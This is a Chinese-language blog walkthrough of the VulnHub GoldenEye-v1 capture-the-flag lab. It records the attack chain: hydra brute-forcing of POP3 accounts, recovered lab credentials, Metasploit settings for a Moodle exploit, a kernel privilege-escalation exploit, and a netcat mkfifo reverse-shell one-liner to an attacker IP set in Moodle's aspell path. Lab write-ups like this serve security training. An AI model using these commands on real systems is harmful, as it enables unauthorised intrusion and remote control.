---
layout: post
title:  "GoldenEye-v1"
description: walkthrough
category: vulnhub
---
# GoldenEye-v1

![image-20200628205842666]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628205842666.png)

![image-20200628210117442]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628210117442.png)

![image-20200628203148585]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628203148585.png)

![image-20200628203234215]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628203234215.png)

```bash
boris:&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```

并且额外知道了另一个用户natalya

bp使用html解码

![image-20200628203338181]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628203338181.png)

```bash
boris:InvincibleHack3r
```

![image-20200628203539893]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628203539893.png)

![image-20200628203814681]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628203814681.png)

再没有更多的信息了。

尝试使用得到的凭证在25端口上复用，但是失败。

尝试利用已知的两个用户名，在25端口上进行暴力。

首先通过VRFY命令确认用户名是否存在，

![image-20200628204444559]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628204444559.png)

两个用户都存在，分别爆破密码

```bash
hydra -v -l boris -P /usr/share/wordlists/fasttrack.txt -t 20 192.168.43.239 -s 55007 -I pop3
hydra -v -l natalya -P /usr/share/wordlists/fasttrack.txt -t 20 192.168.43.239 -s 55007 -I pop3
```

![image-20200628210521185]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628210521185.png)

![image-20200628210913995]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628210913995.png)

boris

```bash
boris:secret1!
```



![image-20200628210758507]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628210758507.png)

成功登录，但是三封邮件都没有什么关键信息。

natalya

```bash
natalya:bird
```

![image-20200628211109388]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628211109388.png)

第二封邮件中发现重要信息

![image-20200628211249092]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628211249092.png)

```bash
username: xenia
password: RCP90rulez!
severnaya-station.com
severnaya-station.com/gnocertdir
```

修改hosts

![image-20200628211505466]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628211505466.png)

![image-20200628211617915]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628211617915.png)

![image-20200628211703602]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628211703602.png)

![image-20200628212739347]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628212739347.png)

在右侧发现，显然后台是有管理员帐户admin的返回查看了登录框。显然暴力不是合适的处理方式。继续搜寻线索

![image-20200628212719461]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628212719461.png)

查看了一圈并没有什么可利用的点，但是找到了另外一个用户

![image-20200628212017482]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628212017482.png)

doak，再次在邮件服务中确认用户

![image-20200628212226792]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628212226792.png)

用户存在，爆破密码

```bash
hydra -v -l doak -P /usr/share/wordlists/fasttrack.txt -t 20 192.168.43.239 -s 55007 -I pop3
```

![image-20200628212906236]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628212906236.png)

```bash
doak:goat
```

换账户登录邮件

![image-20200628213117682]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628213117682.png)

```bash
username: dr_doak
password: 4England!
```

使用新凭证登录网站，消息中有和admin user的联系人，但是并没有什么消息。

![image-20200628213247498]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628213247498.png)

但是在个人文件中发现线索

![image-20200628213453978]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628213453978.png)

![image-20200628213526657]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628213526657.png)

```bash
http://severnaya-station.com/dir007key/for-007.jpg
```

![image-20200628213606940]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628213606940.png)

注意到图片下方的文字，捡起了一把access key，应该有凭证

下载到本地分析

![image-20200628213831947]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628213831947.png)

exif中存有base64信息

![image-20200628213928650]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628213928650.png)

```bash
xWinter1995x!
```

猜测为admin密码。

尝试登录网站

成功，并且admin拥有额外的管理功能。在system paths中的aspell看上去是可以执行系统命令的。

![image-20200628214349022]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628214349022.png)

我们来尝试写入我们自己的payload，注意，这里一定要保留 sh -c，而中间的内容则可以修改。因为这个PSpellshell中并不能直接执行，而是要先调用sh，让sh去执行命令。

```bash
sh -c '(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.43.66 4444 >/tmp/f)'
```

![image-20200628215040614]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628215040614.png)

换了很多payload以及端口，尝试多次仍然不行。

换一个思路

![image-20200628223352949]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628223352949.png)

版本号moodle 2.2.3

msf

![image-20200628223946253]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628223946253.png)

```bash
set PASSWORD xWinter1995x!
set rhosts 192.168.43.239
set VHOST severnaya-station.com
set TARGETURI /gnocertdir
set lhost 192.168.43.66
set lport 4444
```

![image-20200628224922190]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628224922190.png)

也失败了。

![image-20200628225118518]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628225118518.png)

嗯嗯嗯嗯。。。

检查平台设置，一定是一些设置阻止了正常执行，手动执行时返回是正常检查了文本，那么可能payload根本就没被调用

![image-20200628230914585]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628230914585.png)

终于在设置中找到下面的拼写检查引擎设置，网站默认使用的是google spell，而并不是我们之前手动尝试的pspellshell，这就是为什么无论手动还是msf都无法正确执行的原因。![image-20200628231135107]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628231135107.png)

修改成我们需要的选项

![image-20200628231356871]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628231356871.png)

修改过之后无论手动还是msf都可以正确执行了。

![image-20200628234706855]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628234706855.png)

![image-20200628232542844]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628232542844.png)

![image-20200628232916256]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628232916256.png)

![image-20200628233126169]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628233126169.png)

直接内核提权。37292

值得注意的是

目标机器上并没有安装gcc而是cc

![image-20200628233227105]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628233227105.png)

所以要把代码中的命令改为CC

![image-20200628233448676]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628233448676.png)

，否则提权会失败，出现没有找到gcc

![image-20200628233850923]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628233850923.png)

修改后编译上传执行。root。

这部分没什么意思，所以就简写了。

![image-20200628233941647]({{ site.url }}/assets/GoldenEye-v1.assets/image-20200628233941647.png)

倒是手动执行